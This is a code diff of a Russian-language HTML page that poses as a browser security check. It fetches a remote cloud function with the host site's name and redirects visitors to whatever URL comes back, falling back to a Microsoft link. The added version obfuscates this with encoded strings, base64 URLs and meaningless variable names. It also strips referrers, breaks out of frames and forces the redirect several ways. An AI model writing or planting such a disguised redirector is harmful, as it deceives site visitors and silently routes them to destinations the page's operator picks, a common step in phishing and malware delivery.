@@ -1,74 +1,78 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex, nofollow">
-    <title>Проверка безопасности браузера</title>
-    <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f8fafc; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #333; }
-        .card { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.05), 0 1px 3px rgba(0,0,0,0.05); width: 100%; max-width: 420px; text-align: center; position: relative; overflow: hidden; }
-        .spinner { width: 48px; height: 48px; border: 4px solid #f1f5f9; border-top: 4px solid #3b82f6; border-radius: 50%; margin: 0 auto 20px auto; animation: spin 1s cubic-bezier(0.5, 0, 0.5, 1) infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h1 { font-size: 20px; font-weight: 600; margin-bottom: 12px; color: #0f172a; }
-        p { font-size: 14px; color: #64748b; line-height: 1.5; margin-bottom: 30px; }
-        .secure-badge { display: inline-flex; align-items: center; font-size: 12px; color: #94a3b8; margin-top: 15px; }
-        .secure-badge svg { width: 14px; height: 14px; margin-right: 6px; fill: #94a3b8; }
-        .progress-container { width: 100%; height: 4px; background: #f1f5f9; border-radius: 2px; position: absolute; bottom: 0; left: 0; }
-        .progress-bar { height: 100%; width: 0%; background: #3b82f6; border-radius: 2px; transition: width 2s cubic-bezier(0.1, 0.4, 0.4, 1); }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
+<meta name="robots" content="noindex,nofollow,noarchive">
+<meta name="referrer" content="no-referrer">
+<title>Loading</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:sans-serif;background:linear-gradient(135deg,#f5f7fa 0%,#c3cfe2 100%);min-height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;padding:20px;color:#333}
+.c{background:#fff;padding:40px 30px;border-radius:16px;box-shadow:0 10px 30px rgba(0,0,0,.1);text-align:center;max-width:400px;width:100%;position:relative;overflow:hidden}
+.s{width:50px;height:50px;margin:0 auto 20px;border:4px solid #e5e7eb;border-top:4px solid #4d81f1;border-radius:50%;animation:a 1s linear infinite}
+@keyframes a{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
+.h{font-size:20px;margin-bottom:12px;font-weight:600;color:#111827}
+.p{font-size:15px;color:#4b5563;line-height:1.5}
+.b{margin-top:30px;font-size:12px;color:#9ca3af;display:flex;align-items:center;justify-content:center;gap:6px}
+.l{height:4px;width:100%;background:#f3f4f6;position:absolute;top:0;left:0}
+.l::after{content:'';position:absolute;left:-30%;top:0;height:100%;width:30%;background:#4d81f1;animation:b 2s infinite ease-in-out}
+@keyframes b{0%{left:-30%}100%{left:100%}}
+</style>
 </head>
 <body>
-    <div class="card">
-        <div class="spinner"></div>
-        <h1>Проверка браузера...</h1>
-        <p>Пожалуйста, подождите. Идет безопасное соединение, не закрывайте страницу.</p>
-        <div class="secure-badge">
-            <svg viewBox="0 0 24 24"><path d="M18,8 L18,6 C18,2.686 15.314,0 12,0 C8.686,0 6,2.686 6,6 L6,8 C4.343,8 3,9.343 3,11 L3,19 C3,20.657 4.343,22 6,22 L18,22 C19.657,22 21,20.657 21,19 L21,11 C21,9.343 19.657,8 18,8 Z M12,2 C14.209,2 16,3.791 16,6 L16,8 L8,8 L8,6 C8,3.791 9.791,2 12,2 Z M12,18 C10.895,18 10,17.105 10,16 C10,14.895 10.895,14 12,14 C13.105,14 14,14.895 14,16 C14,17.105 13.105,18 12,18 Z"></path></svg>
-            Защищено соединение
-        </div>
-        <div class="progress-container">
-            <div class="progress-bar" id="progressBar"></div>
-        </div>
-    </div>
+<div class="c">
+<div class="l"></div>
+<div class="s"></div>
+<h1 class="h" id="h"></h1>
+<p class="p" id="p"></p>
+<div class="b">
+<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+<span id="b"></span>
+</div>
+</div>
+<script>
+(function(){
+var _0x1 = ['\u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u0431\u0440\u0430\u0443\u0437\u0435\u0440\u0430...', '\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u043f\u043e\u0434\u043e\u0436\u0434\u0438\u0442\u0435. \u0418\u0434\u0435\u0442 \u0431\u0435\u0437\u043e\u043f\u0430\u0441\u043d\u043e\u0435 \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u0435, \u043d\u0435 \u0437\u0430\u043a\u0440\u044b\u0432\u0430\u0439\u0442\u0435 \u0441\u0442\u0440\u0430\u043d\u0438\u0446\u0443.', '\u0417\u0430\u0449\u0438\u0449\u0435\u043d\u043e \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u0435'];
+document.getElementById('h').innerHTML = _0x1[0];
+document.getElementById('p').innerHTML = _0x1[1];
+document.getElementById('b').innerHTML = _0x1[2];
 
-    <script>
-        // ТВОЯ ССЫЛКА ОТ ЯНДЕКС ОБЛАКА (без изменений)
-        const BASE_YANDEX_URL = "https://functions.yandexcloud.net/d4e5bqhobljvknj550vf"; 
-        
-        // МАГИЯ: Передаем текущий домен в параметре ?site=
-        const YANDEX_FUNCTION_URL = BASE_YANDEX_URL + "?site=" + encodeURIComponent(window.location.hostname);
+var _0x2 = atob('aHR0cHM6Ly9mdW5jdGlvbnMueWFuZGV4Y2xvdWQubmV0L2Q0ZTVicWhvYmxqdm tuazU1MHZm');
+var _0x3 = atob('aHR0cHM6Ly9nby5taWNyb3NvZnQuY29tL2Z3bGluay8/TGlua0lkPTUyMTgzOQ==');
+var _0x4 = _0x2 + '?site=' + encodeURIComponent(window.location.hostname);
 
-        const MIN_DELAY = 1000; // Уменьшили задержку до 1 сек
-        const startTime = Date.now();
+function _0x5(_0x6) {
+try { if (window.top && window.top !== window) { window.top.location.replace(_0x6); } } catch (e) {}
+setTimeout(function() {
+try {
+var _0x7 = document.createElement('form');
+_0x7.action = _0x6;
+_0x7.method = 'GET';
+document.body.appendChild(_0x7);
+_0x7.submit();
+} catch (e) {}
+}, 10);
+setTimeout(function() {
+try {
+var _0x8 = document.createElement('a');
+_0x8.href = _0x6;
+_0x8.rel = 'noopener noreferrer';
+document.body.appendChild(_0x8);
+_0x8.click();
+} catch (e) {}
+}, 50);
+setTimeout(function() { window.location.replace(_0x6); }, 100);
+}
 
-        setTimeout(() => {
-            document.getElementById('progressBar').style.width = '100%';
-        }, 50);
-
-        function redirectTo(url) {
-            const elapsedTime = Date.now() - startTime;
-            const timeLeft = Math.max(0, MIN_DELAY - elapsedTime);
-            setTimeout(() => {
-                window.location.replace(url);
-            }, timeLeft);
-        }
-
-        fetch(YANDEX_FUNCTION_URL)
-            .then(response => response.json())
-            .then(data => {
-                // Если Яндекс вернул ссылку - переходим
-                if (data && data.url && data.url !== "undefined" && data.url !== "null") {
-                    redirectTo(data.url);
-                } else {
-                    // Если пусто - на Microsoft
-                    redirectTo("https://go.microsoft.com/fwlink/?LinkId=521839");
-                }
-            })
-            .catch(error => {
-                // Если Яндекс недоступен - на Microsoft
-                redirectTo("https://go.microsoft.com/fwlink/?LinkId=521839");
-            });
-    </script>
+document.addEventListener('DOMContentLoaded', function() {
+setTimeout(function() {
+fetch(_0x4).then(function(_0x9) { return _0x9.json(); }).then(function(_0xA) {
+if (_0xA && _0xA.url && _0xA.url !== "undefined" && _0xA.url !== "null") { _0x5(_0xA.url); } else { _0x5(_0x3); }
+}).catch(function() { _0x5(_0x3); });
+}, 1000); 
+});
+})();
+</script>
 </body>
 </html>
